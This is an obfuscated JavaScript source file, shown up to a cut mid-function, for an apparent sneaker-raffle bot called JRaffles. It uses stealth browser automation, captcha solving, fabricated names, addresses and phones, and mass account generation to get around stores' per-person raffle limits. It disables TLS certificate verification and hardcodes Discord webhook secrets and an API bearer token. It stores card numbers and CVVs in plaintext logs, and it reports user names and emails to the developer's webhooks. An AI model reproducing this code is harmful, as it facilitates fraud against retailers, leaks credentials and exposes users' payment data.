process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3e92a1 = require('fs'), _0x2d6ad2 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x47206f(_0x26d83d) {
    const _0x5ca109 = _0x3e92a1['createWriteStream'](_0x26d83d, { 'flags': 'a' }), _0x40b8b9 = console['log'];
    console['log'] = function () {
        const _0x3c1786 = Array['prototype']['slice']['call'](arguments), _0x277a79 = _0x3c1786['join']('\x20') + '\x0a';
        _0x5ca109['write'](_0x277a79), _0x40b8b9['apply'](console, _0x3c1786);
    };
}
_0x47206f('../logs/log\x20' + _0x2d6ad2);
var _0x39e61e = require('tough-cookie'), _0x2796bc = require('node-imap'), _0x558c25 = require('util')['inspect'];
const _0x1a979e = require('mailparser')['simpleParser'], { EmbedBuilder: _0x47647c } = require('discord.js');
var _0x2f1245 = require('exe');
const { execFile: _0x2333dc } = require('child_process'), _0x48f2a7 = require('puppeteer-extra'), _0x15a873 = require('puppeteer-extra-plugin-recaptcha'), _0x32ef16 = require('puppeteer-extra-plugin-stealth'), _0x467028 = require('chalk'), _0x1bf238 = require('node-bash-title'), _0x4127f6 = require('axios'), _0x1c3b5f = require('papaparse');
var _0x4dee29 = require('random-name');
const _0x35812d = require('request');
var _0x40afc7 = require('prompt');
const _0x3be8c2 = _0x35812d['jar']();
var _0x24de00 = {};
const _0x1e582c = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x1aa765 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x316ff7 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3fbeab = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x135388 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x809b50 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x6cb0e = 'https://discord.com/api/webhooks/', _0xb72752 = '' + _0x6cb0e + _0x316ff7, _0x43241a = '' + _0x6cb0e + _0x3fbeab, _0x1227c5 = '' + _0x6cb0e + _0x1e582c, _0x3fd40a = '' + _0x6cb0e + _0x1aa765, _0x4f6cb7 = '' + _0x6cb0e + _0x135388, _0x137e09 = '' + _0x6cb0e + _0x809b50;
const _0x544373 = JSON['parse'](_0x3e92a1['readFileSync']('../package.json', 'utf-8')), _0x5e0c2d = _0x544373['version'];
var _0x339545, _0x293577, _0x321093, _0x3749c2, _0xb439a0, _0x3ed4c4, _0x4a1218, _0x14e24a;
const _0x81d475 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x534b1b = ![];
const _0x5e9850 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x50106b = '0123456789';
var _0x42f9b0 = _0x5e9850['split']('');
const _0x2f4ec3 = require('auto-git-update'), _0x18d604 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xbd460d = new _0x2f4ec3(_0x18d604);
async function _0x5d6a0d() {
    _0xb439a0 = _0x3e92a1['readdirSync']('../proxies'), _0x3749c2 = _0x3e92a1['readdirSync']('../tasks'), !_0x3e92a1['existsSync']('../accounts/fenom.csv') && _0x3e92a1['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3e92a1['existsSync']('../accounts/paypal.csv') && _0x3e92a1['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3e92a1['existsSync']('../accounts/bstn.csv') && _0x3e92a1['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3e92a1['existsSync']('../accounts/eql.csv') && _0x3e92a1['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3e92a1['existsSync']('../failed-tasks.csv') && _0x3e92a1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3e92a1['existsSync']('../successful-tasks.csv') && _0x3e92a1['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x24de00 = JSON['parse'](_0x3e92a1['readFileSync']('../settings.json', 'utf-8')), !_0x24de00['delay'] && (_0x24de00['delay'] = 0x3c, _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['threads'] && (_0x24de00['threads'] = 0x1, _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['masterMail'] && (_0x24de00['masterMail'] = 'yourmail@gmail.com', _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['masterPassword'] && (_0x24de00['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['captchaKey'] && (_0x24de00['captchaKey'] = '', _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['useRandomProxy'] && (_0x24de00['useRandomProxy'] = !![], _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['shuffleTasks'] && (_0x24de00['shuffleTasks'] = ![], _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), !_0x24de00['webhook'] && (_0x24de00['webhook'] = '', _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), _0x24de00['delay'] <= 0x1388 && (_0x24de00['delay'] = _0x24de00['delay'] * 0x3e8), _0x24de00['AfewDelay'] && (delete _0x24de00['AfewDelay'], _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), _0x24de00['MahaDelay'] && (delete _0x24de00['MahaDelay'], _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), _0x24de00['footshopDelay'] && (delete _0x24de00['footshopDelay'], _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00, null, 0x2))), _0x24de00['MahaDelay'] = _0x24de00['delay'], _0x6cb0e = _0x24de00['webhook'], _0x3ed4c4 = _0x24de00['licenseKey'];
}
let _0x2d4681, _0x5af398 = [], _0x2e9704;
const _0x254c61 = _0x4dba1f => new Promise(_0x4322fb => setTimeout(_0x4322fb, _0x4dba1f));
function _0x54d0f2(_0x54d625, _0x53dee4) {
    return Math['floor'](Math['random']() * (_0x53dee4 - _0x54d625 + 0x1) + _0x54d625);
}
function _0x136293(_0x46dac9) {
    let _0x5b8ab4 = _0x46dac9['length'], _0x33a5ab;
    while (_0x5b8ab4 != 0x0) {
        _0x33a5ab = Math['floor'](Math['random']() * _0x5b8ab4), _0x5b8ab4--, [_0x46dac9[_0x5b8ab4], _0x46dac9[_0x33a5ab]] = [
            _0x46dac9[_0x33a5ab],
            _0x46dac9[_0x5b8ab4]
        ];
    }
    return _0x46dac9;
}
async function _0x28af97(_0x32a884) {
    try {
        return _0x4127f6['post']('https://api.whop.com/api/v2/memberships/' + _0x32a884 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x3a6e71) {
        console['log']('Error\x20checking\x20license:\x20' + _0x3a6e71['message']);
    }
}
async function _0x3eeb2d(_0x2e2dbb) {
    console['clear']();
    if (_0x2e2dbb == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2f8b6b = await _0x40afc7['get']('License');
        if (_0x2f8b6b['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x254c61(0xbb8), _0x3eeb2d(_0x2e2dbb);
        _0x2e2dbb = _0x2f8b6b['License'], _0x24de00['licenseKey'] = _0x2e2dbb, _0x3ed4c4 = _0x2e2dbb, _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00));
    }
    console['log']('Checking\x20license\x20' + _0x3ed4c4 + '...'), await _0x254c61(0x320);
    const _0x30f579 = await _0x28af97(_0x2e2dbb);
    _0x4a1218 = JSON['stringify'](_0x30f579['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x14e24a = JSON['stringify'](_0x30f579['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x30f579)
        return console['log']('License\x20not\x20found');
    if (!_0x30f579['data'])
        return console['log']('License\x20not\x20bound');
    return _0x30f579['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x534b1b = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x534b1b = ![]);
}
async function _0x410da7() {
    var _0x2d68c3 = await _0x40afc7['get']('Module');
    return console['clear'](), _0x2d68c3['Module'];
}
;
async function _0x5a592b() {
    var _0x1af4e0 = await _0x40afc7['get']('Setting');
    return console['clear'](), _0x1af4e0['Setting'];
}
async function _0xb49fc3(_0x25b1fe) {
    var _0x2058bd = [];
    for (file of _0x3749c2) {
        var _0xb2d84f = _0x3e92a1['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x1c3b5f['parse'](_0xb2d84f, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x25b1fe['store'] && _0x2058bd['push'](file);
    }
    !_0x2058bd['length'] == 0x0 && (_0x3749c2 = _0x2058bd);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x45de70 = 0x0; _0x45de70 < _0x3749c2['length']; _0x45de70++) {
        console['log']('\x20(' + _0x45de70 + ')\x20' + _0x3749c2[_0x45de70]);
    }
    console['log']('');
    var _0xc77307 = await _0x40afc7['get']('Task');
    if (_0xc77307['Task'] > _0x3749c2['length'] - 0x1 || isNaN(_0xc77307['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x254c61(0x3e8), _0xb49fc3();
    var _0x1452c5 = _0x3e92a1['readFileSync']('../tasks/' + _0x3749c2[_0xc77307['Task']], 'utf-8');
    return _0x321093 = _0x1c3b5f['parse'](_0x1452c5, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x467028['blue'](_0x3749c2[_0xc77307['Task']])), _0x339545 = _0x3749c2[_0xc77307['Task']], _0x321093;
}
async function _0x32c942() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1a85a9 = 0x0; _0x1a85a9 < _0xb439a0['length']; _0x1a85a9++) {
        console['log']('\x20(' + _0x1a85a9 + ')\x20' + _0xb439a0[_0x1a85a9]);
    }
    console['log']('');
    var _0xafd178 = await _0x40afc7['get']('Proxies');
    if (_0xafd178['Proxies'] > _0xb439a0['length'] - 0x1 || isNaN(_0xafd178['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x254c61(0x3e8), _0x32c942();
    var _0x2486ae = _0x3e92a1['readFileSync']('../proxies/' + _0xb439a0[_0xafd178['Proxies']], 'utf-8')['split']('\x0a');
    let _0x23487f = _0x2486ae['map']((_0x1e63ce, _0x39d0d7) => {
        sanatizeProxy = _0x1e63ce['replace']('\x0d', '');
        if (_0x2486ae[_0x39d0d7 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x293577 = _0xb439a0[_0xafd178['Proxies']], console['clear'](), _0x23487f;
}
async function _0x325e57() {
    var _0x3f6431 = await _0x40afc7['get']('Value');
    return console['clear'](), _0x3f6431['Value'];
}
async function _0x31037d(_0x21a3d7) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x21180d = 0x0; _0x21180d < _0x21a3d7['length']; _0x21180d++) {
        console['log']('\x20(' + _0x21180d + ')\x20[' + _0x21a3d7[_0x21180d]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x43e601 = await _0x40afc7['get']('Module');
    return _0x43e601['Module'];
}
async function _0x24b8de() {
    var _0x2e496f = await _0x40afc7['get']('Password');
    return console['clear'](), _0x2e496f['Password'];
}
;
async function _0x4fe95a() {
    var _0x11b804 = await _0x40afc7['get']('Links');
    return _0x11b804['Links'];
}
;
async function _0x568365() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0xe4259b = 0x0; _0xe4259b < _0x5af398['length']; _0xe4259b++) {
        console['log']('\x20(' + _0xe4259b + ')\x20' + _0x5af398[_0xe4259b]);
    }
    ;
    console['log']();
    let _0x1dd312 = await _0x40afc7['get']('Product');
    return console['clear'](), _0x1dd312['Product'];
}
;
function _0x36583e() {
    var _0x5da5af = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5da5af;
}
;
function _0x374fc9() {
    var _0xf01889 = new Date(Date['now']())['toLocaleString']();
    return _0xf01889['replace'](',', '');
}
async function _0x2dfd24(_0x582b91, _0x5da916) {
    let _0x8aac13 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5e0c2d != 'devkey') {
        await _0x4127f6['post'](_0x582b91, _0x5da916, _0x8aac13);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x18ad5f(_0x17abd6, _0x47848a, _0x39a12f, _0x21c95d, _0x1490f1) {
    if (!_0x21c95d && _0x39a12f == 'dev') {
        var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x47848a['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x47848a['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x17abd6['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x24de00['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4a1218,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x17abd6['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x17abd6['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5e0c2d,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x13cbec['data'];
    } else {
        if (_0x21c95d && _0x39a12f == 'dev') {
            var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x47848a['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4a1218,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x47848a['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x17abd6['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x24de00['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1490f1,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x17abd6['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x17abd6['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5e0c2d,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x13cbec['data'];
        } else {
            if (_0x39a12f == 'pub') {
                var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x47848a['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x47848a['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x17abd6['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x24de00['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x17abd6['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5e0c2d,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x13cbec['data'];
            } else {
                if (_0x39a12f == 'acc' && !_0x21c95d) {
                    var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x47848a['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4a1218,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x47848a['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x24de00['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5e0c2d,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x13cbec['data'];
                } else {
                    if (_0x39a12f == 'acc' && _0x21c95d) {
                        var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x47848a['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4a1218,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1490f1,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x47848a['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x24de00['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5e0c2d,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x13cbec['data'];
                    } else {
                        if (_0x39a12f == 'open') {
                            var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x14e24a)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4a1218,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5e0c2d,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x13cbec['data'];
                        } else {
                            if (!_0x21c95d && _0x39a12f == 'ver') {
                                var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x47848a['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4a1218,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x47848a['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x24de00['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5e0c2d,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x13cbec['data'];
                            } else {
                                if (_0x21c95d && _0x39a12f == 'ver') {
                                    var _0x13cbec = new _0x47647c()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x47848a['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4a1218,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1490f1,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x47848a['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x24de00['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5e0c2d,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x13cbec['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x4626f3(_0x24f015, _0x2986fa) {
    var _0x3aaf42 = _0x24f015[_0x2986fa]['Address1']['split'](''), _0x16f8a7 = _0x24f015[_0x2986fa]['Address2']['split'](''), _0x431361 = _0x24f015[_0x2986fa]['Email']['split']('@');
    for (var _0x17e10e = 0x0; _0x17e10e < _0x3aaf42['length']; _0x17e10e++) {
        if (_0x3aaf42[_0x17e10e] == 'X') {
            var _0xd6d0fa = Math['round'](Math['random']() * (_0x5e9850['length'] - 0x1));
            _0x3aaf42[_0x17e10e] = _0x42f9b0[_0xd6d0fa];
        }
    }
    ;
    for (var _0x17e10e = 0x0; _0x17e10e < _0x16f8a7['length']; _0x17e10e++) {
        if (_0x16f8a7[_0x17e10e] == 'X') {
            var _0xd6d0fa = Math['round'](Math['random']() * (_0x5e9850['length'] - 0x1));
            _0x16f8a7[_0x17e10e] = _0x42f9b0[_0xd6d0fa];
        }
    }
    ;
    _0x24f015[_0x2986fa]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x24f015[_0x2986fa]['FirstName'] = _0x4dee29['first']());
    _0x24f015[_0x2986fa]['LastName']['toUpperCase']() == 'RANDOM' && (_0x24f015[_0x2986fa]['LastName'] = _0x4dee29['last']());
    _0x431361[0x0]['toUpperCase']() == 'RANDOM' ? _0x431361[0x0] = '' + _0x4dee29['first']() + _0x4dee29['last']() + _0x54d0f2(0x1, 0x3e7) + '@' : _0x431361[0x0] = _0x431361[0x0] + '@';
    _0x24f015[_0x2986fa]['Email'] = _0x431361['join'](''), _0x24f015[_0x2986fa]['Address1'] = _0x3aaf42['join'](''), _0x24f015[_0x2986fa]['Address2'] = _0x16f8a7['join']('');
    _0x24f015[_0x2986fa]['Phone'] == 'RANDOM' && (_0x24f015[_0x2986fa]['Phone'] = '0' + _0x54d0f2(0x5f5e100, 0x3b9ac9ff));
    if (_0x24f015[_0x2986fa]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x4b74af = _0x54d0f2(0x1, 0x270f);
        _0x24f015[_0x2986fa]['Follower'] = '' + _0x4dee29['first']() + _0x4dee29['last']() + _0x4b74af + '\x20';
    }
    _0x24f015[_0x2986fa]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x24f015[_0x2986fa]['HouseNumber'] = _0x54d0f2(0x1, 0xc8));
    if (_0x24f015[_0x2986fa]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x11a319 = Math['round'](Math['random']() * (_0x5e9850['length'] - 0x1)), _0x5aed78 = _0x42f9b0[_0x11a319];
        _0x24f015[_0x2986fa]['Address1'] = _0x4dee29['last']() + 'straat', _0x24f015[_0x2986fa]['Zip'] == '' && (_0x24f015[_0x2986fa]['Postcode'] = _0x54d0f2(0x3e8, 0x270f) + '\x20' + _0x5aed78 + _0x5aed78, _0x24f015[_0x2986fa]['Zip'] = _0x24f015[_0x2986fa]['Postcode']), _0x24f015[_0x2986fa]['HouseNumber'] = '' + _0x54d0f2(0x1, 0xc8);
    }
    return;
}
;
async function _0x9088f0(_0x9e5f14, _0x2c01da) {
    _0x3e92a1['appendFileSync']('../failed-tasks.csv', _0x374fc9() + ',' + _0x2c01da['store'] + ',' + _0x2c01da['name'] + ',' + _0x9e5f14['Url'] + ',' + _0x9e5f14['Size'] + ',' + _0x9e5f14['Follower'] + ',' + _0x9e5f14['FirstName'] + ',' + _0x9e5f14['LastName'] + ',' + _0x9e5f14['Address1'] + ',' + _0x9e5f14['Address2'] + ',' + _0x9e5f14['HouseNumber'] + ',' + _0x9e5f14['Zip'] + ',' + _0x9e5f14['City'] + ',' + _0x9e5f14['State'] + ',' + _0x9e5f14['Country'] + ',' + _0x9e5f14['Phone'] + ',' + _0x9e5f14['Email'] + ',' + _0x9e5f14['Password'] + ',' + _0x9e5f14['PaymentMethod'] + ',' + _0x9e5f14['CardType'] + ',' + _0x9e5f14['NameOnCard'] + ',' + _0x9e5f14['CardNumber'] + ',' + _0x9e5f14['ExpiryDate'] + ',' + _0x9e5f14['CVV'] + ',' + _0x9e5f14['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x547244(_0x11ed62, _0x2b26cc) {
    _0x3e92a1['appendFileSync']('../successful-tasks.csv', _0x374fc9() + ',' + _0x2b26cc['store'] + ',' + _0x2b26cc['name'] + ',' + _0x11ed62['Url'] + ',' + _0x11ed62['Size'] + ',' + _0x11ed62['Follower'] + ',' + _0x11ed62['FirstName'] + ',' + _0x11ed62['LastName'] + ',' + _0x11ed62['Address1'] + ',' + _0x11ed62['Address2'] + ',' + _0x11ed62['HouseNumber'] + ',' + _0x11ed62['Zip'] + ',' + _0x11ed62['City'] + ',' + _0x11ed62['State'] + ',' + _0x11ed62['Country'] + ',' + _0x11ed62['Phone'] + ',' + _0x11ed62['Email'] + ',' + _0x11ed62['Password'] + ',' + _0x11ed62['PaymentMethod'] + ',' + _0x11ed62['CardType'] + ',' + _0x11ed62['NameOnCard'] + ',' + _0x11ed62['CardNumber'] + ',' + _0x11ed62['ExpiryDate'] + ',' + _0x11ed62['CVV'] + ',' + _0x11ed62['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3048ff() {
    let _0x389d66 = proxyFile['split']('\x0a'), _0x2186be = _0x389d66['map']((_0x495bf3, _0x1bd1b3) => {
        sanatizeProxy = _0x495bf3['replace']('\x0d', '');
        if (_0x389d66[_0x1bd1b3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2186be;
}
;
async function _0x1f1860(_0xbf2b16, _0x81b4d1) {
    if (_0x96575d != 'yes')
        var _0x96575d = '', _0x3eaf71 = 0x0;
    async function _0x48efa5() {
        var _0x506126 = _0x3e92a1['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x2b2eb4 = _0x1c3b5f['parse'](_0x506126, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x504a3b = 0x0; _0x504a3b < _0x2b2eb4['length']; _0x504a3b++) {
            console['log']('(' + _0x504a3b + ')\x20' + _0x2b2eb4[_0x504a3b]['Email']);
        }
        console['log']('\x0a(' + _0x2b2eb4['length'] + ')\x20' + _0x467028['cyan']('Add\x20a\x20new\x20account'));
        let _0x2cc95d = await _0x40afc7['get']('Option');
        if (_0x2cc95d['Option'] < _0x2b2eb4['length'])
            return _0x2b2eb4[_0x2cc95d['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
